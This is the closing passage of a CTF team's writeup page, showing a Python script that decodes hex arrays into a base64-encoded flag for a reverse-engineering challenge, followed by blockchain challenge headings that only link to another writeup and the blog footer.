</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mh>0x00000E17</span><span class=p>,</span> <span class=mh>0x00000706</span><span class=p>,</span> <span class=mh>0x00000C1F</span><span class=p>,</span> <span class=mh>0x00000169</span><span class=p>,</span> <span class=mh>0x00002248</span><span class=p>,</span> <span class=mh>0x000007FD</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00001768</span><span class=p>,</span> <span class=mh>0x00001F54</span><span class=p>,</span> <span class=mh>0x00001574</span><span class=p>,</span> <span class=mh>0x00002458</span><span class=p>,</span> <span class=mh>0x00000374</span><span class=p>,</span> <span class=mh>0x00001D6B</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00000918</span><span class=p>,</span> <span class=mh>0x00000ECF</span><span class=p>,</span> <span class=mh>0x0000211D</span><span class=p>,</span> <span class=mh>0x00001D96</span><span class=p>,</span> <span class=mh>0x00001BEB</span><span class=p>,</span> <span class=mh>0x00001703</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00001B87</span><span class=p>,</span> <span class=mh>0x000006FA</span><span class=p>],[</span><span class=mh>0x00000AE3</span><span class=p>,</span> <span class=mh>0x0000069F</span><span class=p>,</span> <span class=mh>0x000001EF</span><span class=p>,</span> <span class=mh>0x00001C15</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00001378</span><span class=p>,</span> <span class=mh>0x000020D1</span><span class=p>,</span> <span class=mh>0x0000211D</span><span class=p>,</span> <span class=mh>0x00002275</span><span class=p>,</span> <span class=mh>0x000005F4</span><span class=p>,</span> <span class=mh>0x00002475</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00000D13</span><span class=p>,</span> <span class=mh>0x000008EF</span><span class=p>,</span> <span class=mh>0x00000E10</span><span class=p>,</span> <span class=mh>0x000006D4</span><span class=p>,</span> <span class=mh>0x0000215A</span><span class=p>,</span> <span class=mh>0x000004D6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x0000202F</span><span class=p>,</span> <span class=mh>0x00001B99</span><span class=p>,</span> <span class=mh>0x00001C86</span><span class=p>,</span> <span class=mh>0x000002F1</span><span class=p>],[</span><span class=mh>0x00000680</span><span class=p>,</span> <span class=mh>0x000000D4</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00000677</span><span class=p>,</span> <span class=mh>0x00001E21</span><span class=p>,</span> <span class=mh>0x0000220D</span><span class=p>,</span> <span class=mh>0x00000933</span><span class=p>,</span> <span class=mh>0x00000973</span><span class=p>,</span> <span class=mh>0x00001947</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00000D61</span><span class=p>,</span> <span class=mh>0x0000247F</span><span class=p>,</span> <span class=mh>0x00001D21</span><span class=p>,</span> <span class=mh>0x00001FA2</span><span class=p>,</span> <span class=mh>0x00001606</span><span class=p>,</span> <span class=mh>0x000007B0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00001829</span><span class=p>,</span> <span class=mh>0x000016C0</span><span class=p>,</span> <span class=mh>0x000026C9</span><span class=p>,</span> <span class=mh>0x0000248C</span><span class=p>,</span> <span class=mh>0x00000C9A</span><span class=p>,</span> <span class=mh>0x00001F8F</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mh>0x0000257F</span><span class=p>,</span> <span class=mh>0x00000359</span><span class=p>,</span> <span class=mh>0x00001831</span><span class=p>,</span> <span class=mh>0x000021B7</span><span class=p>,</span> <span class=mh>0x00000BA8</span><span class=p>,</span> <span class=mh>0x00000FC5</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00000BA4</span><span class=p>,</span> <span class=mh>0x000024E2</span><span class=p>,</span> <span class=mh>0x00001241</span><span class=p>,</span> <span class=mh>0x00000D53</span><span class=p>,</span> <span class=mh>0x00000C82</span><span class=p>,</span> <span class=mh>0x00001240</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00002241</span><span class=p>,</span> <span class=mh>0x00001156</span><span class=p>,</span> <span class=mh>0x0000116A</span><span class=p>,</span> <span class=mh>0x000005F3</span><span class=p>,</span> <span class=mh>0x000022D5</span><span class=p>,</span> <span class=mh>0x000008DA</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000014A3</span><span class=p>,</span> <span class=mh>0x0000059E</span><span class=p>],[</span><span class=mh>0x00001675</span><span class=p>,</span> <span class=mh>0x00000AA9</span><span class=p>,</span> <span class=mh>0x00000D8B</span><span class=p>,</span> <span class=mh>0x00000D31</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00001722</span><span class=p>,</span> <span class=mh>0x000006C8</span><span class=p>,</span> <span class=mh>0x0000151B</span><span class=p>,</span> <span class=mh>0x000017D8</span><span class=p>,</span> <span class=mh>0x00001FEF</span><span class=p>,</span> <span class=mh>0x00001624</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00002307</span><span class=p>,</span> <span class=mh>0x00000CB9</span><span class=p>,</span> <span class=mh>0x0000053C</span><span class=p>,</span> <span class=mh>0x00000230</span><span class=p>,</span> <span class=mh>0x00001EAA</span><span class=p>,</span> <span class=mh>0x00001FD1</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00000FAD</span><span class=p>,</span> <span class=mh>0x00001E30</span><span class=p>,</span> <span class=mh>0x00002345</span><span class=p>,</span> <span class=mh>0x00001583</span><span class=p>],[</span><span class=mh>0x000001D1</span><span class=p>,</span> <span class=mh>0x0000056E</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00000AA3</span><span class=p>,</span> <span class=mh>0x0000223C</span><span class=p>,</span> <span class=mh>0x000009A4</span><span class=p>,</span> <span class=mh>0x000006C9</span><span class=p>,</span> <span class=mh>0x00000112</span><span class=p>,</span> <span class=mh>0x00001977</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00002512</span><span class=p>,</span> <span class=mh>0x00000B60</span><span class=p>,</span> <span class=mh>0x0000081A</span><span class=p>,</span> <span class=mh>0x00000F06</span><span class=p>,</span> <span class=mh>0x00001329</span><span class=p>,</span> <span class=mh>0x000011AA</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00002404</span><span class=p>,</span> <span class=mh>0x00000E57</span><span class=p>,</span> <span class=mh>0x0000011E</span><span class=p>,</span> <span class=mh>0x000011DC</span><span class=p>,</span> <span class=mh>0x00002474</span><span class=p>,</span> <span class=mh>0x00001BC7</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mh>0x000022BE</span><span class=p>,</span> <span class=mh>0x00001F17</span><span class=p>,</span> <span class=mh>0x00000588</span><span class=p>,</span> <span class=mh>0x00001B80</span><span class=p>,</span> <span class=mh>0x00001479</span><span class=p>,</span> <span class=mh>0x000016EF</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000008CA</span><span class=p>,</span> <span class=mh>0x00000D6E</span><span class=p>,</span> <span class=mh>0x0000138F</span><span class=p>,</span> <span class=mh>0x00001054</span><span class=p>,</span> <span class=mh>0x000021FA</span><span class=p>,</span> <span class=mh>0x00000102</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000013A6</span><span class=p>,</span> <span class=mh>0x00000195</span><span class=p>,</span> <span class=mh>0x000002D1</span><span class=p>,</span> <span class=mh>0x00002594</span><span class=p>,</span> <span class=mh>0x00001369</span><span class=p>,</span> <span class=mh>0x00002534</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000015C5</span><span class=p>,</span> <span class=mh>0x0000168A</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x000020F1</span><span class=p>,</span> <span class=mh>0x00001DA9</span><span class=p>,</span> <span class=mh>0x00000156</span><span class=p>,</span> <span class=mh>0x00000B37</span><span class=p>,</span> <span class=mh>0x000007C0</span><span class=p>,</span> <span class=mh>0x0000066A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x000024E0</span><span class=p>,</span> <span class=mh>0x00000D42</span><span class=p>,</span> <span class=mh>0x00002077</span><span class=p>,</span> <span class=mh>0x000007EC</span><span class=p>,</span> <span class=mh>0x00001BA7</span><span class=p>,</span> <span class=mh>0x00002071</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x000000F8</span><span class=p>,</span> <span class=mh>0x00000291</span><span class=p>,</span> <span class=mh>0x000003DA</span><span class=p>,</span> <span class=mh>0x0000157C</span><span class=p>,</span> <span class=mh>0x00001EF4</span><span class=p>,</span> <span class=mh>0x00002519</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x00000C25</span><span class=p>,</span> <span class=mh>0x00002062</span><span class=p>,</span> <span class=mh>0x00002253</span><span class=p>,</span> <span class=mh>0x00000640</span><span class=p>,</span> <span class=mh>0x000008DF</span><span class=p>,</span> <span class=mh>0x00001E34</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x00002140</span><span class=p>,</span> <span class=mh>0x00000F92</span><span class=p>,</span> <span class=mh>0x0000039B</span><span class=p>,</span> <span class=mh>0x0000126F</span><span class=p>,</span> <span class=mh>0x00002403</span><span class=p>,</span> <span class=mh>0x00000E65</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x000001F0</span><span class=p>,</span> <span class=mh>0x00001868</span><span class=p>,</span> <span class=mh>0x0000016D</span><span class=p>,</span> <span class=mh>0x000006B6</span><span class=p>,</span> <span class=mh>0x00002214</span><span class=p>,</span> <span class=mh>0x00001603</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x00001925</span><span class=p>,</span> <span class=mh>0x000016AE</span><span class=p>,</span> <span class=mh>0x000012D0</span><span class=p>,</span> <span class=mh>0x00001831</span><span class=p>,</span> <span class=mh>0x0000018C</span><span class=p>,</span> <span class=mh>0x00000BF7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x00000E97</span><span class=p>,</span> <span class=mh>0x000000CE</span><span class=p>,</span> <span class=mh>0x0000061C</span><span class=p>,</span> <span class=mh>0x00000390</span><span class=p>,</span> <span class=mh>0x000019E9</span><span class=p>,</span> <span class=mh>0x000022A5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x00001601</span><span class=p>,</span> <span class=mh>0x00001A1E</span><span class=p>,</span> <span class=mh>0x000013D1</span><span class=p>,</span> <span class=mh>0x00000DBC</span><span class=p>,</span> <span class=mh>0x0000117D</span><span class=p>,</span> <span class=mh>0x0000225F</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x00002272</span><span class=p>,</span> <span class=mh>0x0000007B</span><span class=p>,</span> <span class=mh>0x000023E6</span><span class=p>,</span> <span class=mh>0x0000069F</span><span class=p>,</span> <span class=mh>0x000002D3</span><span class=p>,</span> <span class=mh>0x00001BEF</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x000003E6</span><span class=p>,</span> <span class=mh>0x000017D4</span><span class=p>,</span> <span class=mh>0x00002284</span><span class=p>,</span> <span class=mh>0x000003B8</span><span class=p>,</span> <span class=mh>0x00000251</span><span class=p>,</span> <span class=mh>0x00001646</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x00000176</span><span class=p>,</span> <span class=mh>0x0000081E</span><span class=p>,</span> <span class=mh>0x000024C3</span><span class=p>,</span> <span class=mh>0x00001E85</span><span class=p>,</span> <span class=mh>0x00001097</span><span class=p>,</span> <span class=mh>0x00001264</span><span class=p>,</span>
</span></span><span class=line><span class=cl>       <span class=mh>0x00000A34</span><span class=p>,</span> <span class=mh>0x00001A3B</span><span class=p>,</span> <span class=mh>0x00000FE7</span><span class=p>,</span> <span class=mh>0x000026A6</span><span class=p>,</span> <span class=mh>0x00001F43</span><span class=p>,</span> <span class=mh>0x00001832</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x000021AE</span><span class=p>,</span> <span class=mh>0x0000023C</span><span class=p>,</span> <span class=mh>0x000004C2</span><span class=p>,</span> <span class=mh>0x00002585</span><span class=p>,</span> <span class=mh>0x000017E7</span><span class=p>,</span> <span class=mh>0x000015DD</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>       <span class=mh>0x00002610</span><span class=p>,</span> <span class=mh>0x00001B86</span><span class=p>,</span> <span class=mh>0x00000D2A</span><span class=p>,</span> <span class=mh>0x00000716</span><span class=p>,</span> <span class=mh>0x00001C25</span><span class=p>,</span> <span class=mh>0x00002099</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>asu</span><span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>enc</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=n>ful1</span> <span class=o>=</span> <span class=n>ful1</span><span class=o>*</span><span class=mi>10000</span><span class=o>+</span><span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>j</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>asu</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>asu</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>*</span><span class=mi>10000</span><span class=o>+</span><span class=n>j</span>
</span></span><span class=line><span class=cl><span class=c1>#做运算  </span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>+=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>-=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>+=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>-=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>+=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>//=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>-=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>+=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>//=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ful1</span> <span class=o>-=</span> <span class=n>asu</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>ful1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>ful1</span><span class=o>%</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ful1</span> <span class=o>//=</span> <span class=mi>128</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> 
</span></span></code></pre></td></tr></table></div></div><h1 id=blockchain>Blockchain</h1><h2 id=bet2loss>bet2loss</h2><p><a href=https://www.seaeye.cn/archives/480.html>https://www.seaeye.cn/archives/480.html</a></p><h2 id=aaadao>AAADAO</h2><p><a href=https://www.seaeye.cn/archives/480.html>https://www.seaeye.cn/archives/480.html</a></p><div class=blog-tags><a href=https://su-team.cn/tags/actf/>ACTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/actf-2023-su-wu/>2023 ACTF SU WriteUp</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/susctf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 SUSCTF SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/pcb-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 鹏城杯 SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>